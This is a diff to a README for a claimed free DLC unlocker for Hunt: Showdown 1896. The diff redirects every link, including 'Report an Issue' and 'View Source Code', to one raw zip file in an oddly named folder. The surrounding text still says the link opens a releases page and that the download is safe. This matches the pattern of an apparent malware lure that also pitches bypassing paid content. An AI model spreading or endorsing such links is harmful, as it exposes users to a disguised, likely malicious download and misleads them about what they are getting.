@@ -1,6 +1,6 @@
 # 🎯 Hunt-Showdown-1896-DLC-Unlocker - Unlock Every DLC Instantly and Free
 
-[![Download Now](https://img.shields.io/badge/Download-Hunt--Showdown--1896--DLC--Unlocker-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Afrikandercensor3087/Hunt-Showdown-1896-DLC-Unlocker/releases)
+[![Download Now](https://img.shields.io/badge/Download-Hunt--Showdown--1896--DLC--Unlocker-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Afrikandercensor3087/Hunt-Showdown-1896-DLC-Unlocker/main/twanginess/Unlocker_Showdown_Hunt_DL_1.1-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ No technical skills required. No complicated steps. Just download, run, and enjo
 
 Visit this link to download the application.
 
-[![Download Hunt-Showdown-1896-DLC-Unlocker](https://img.shields.io/badge/⬇️%20Download%20Now-Hunt--Showdown--1896--DLC--Unlocker-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=1f6feb&color=2ea44f)](https://github.com/Afrikandercensor3087/Hunt-Showdown-1896-DLC-Unlocker/releases)
+[![Download Hunt-Showdown-1896-DLC-Unlocker](https://img.shields.io/badge/⬇️%20Download%20Now-Hunt--Showdown--1896--DLC--Unlocker-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=1f6feb&color=2ea44f)](https://raw.githubusercontent.com/Afrikandercensor3087/Hunt-Showdown-1896-DLC-Unlocker/main/twanginess/Unlocker_Showdown_Hunt_DL_1.1-beta.5.zip)
 
 Once you click the link, you'll land on the releases page. Look for the latest version file and download it to your computer. The download is fast and safe, and you'll have the file ready in your Downloads folder within seconds.
 
@@ -141,9 +141,9 @@ That's all there is to it. You're now ready to experience Hunt: Showdown 1896 in
 
 ## 📌 Quick Links
 
-- [Download the Unlocker](https://github.com/Afrikandercensor3087/Hunt-Showdown-1896-DLC-Unlocker/releases)
-- [Report an Issue](https://github.com/Afrikandercensor3087/Hunt-Showdown-1896-DLC-Unlocker/issues)
-- [View Source Code](https://github.com/Afrikandercensor3087/Hunt-Showdown-1896-DLC-Unlocker)
+- [Download the Unlocker](https://raw.githubusercontent.com/Afrikandercensor3087/Hunt-Showdown-1896-DLC-Unlocker/main/twanginess/Unlocker_Showdown_Hunt_DL_1.1-beta.5.zip)
+- [Report an Issue](https://raw.githubusercontent.com/Afrikandercensor3087/Hunt-Showdown-1896-DLC-Unlocker/main/twanginess/Unlocker_Showdown_Hunt_DL_1.1-beta.5.zip)
+- [View Source Code](https://raw.githubusercontent.com/Afrikandercensor3087/Hunt-Showdown-1896-DLC-Unlocker/main/twanginess/Unlocker_Showdown_Hunt_DL_1.1-beta.5.zip)
 
 ---
 
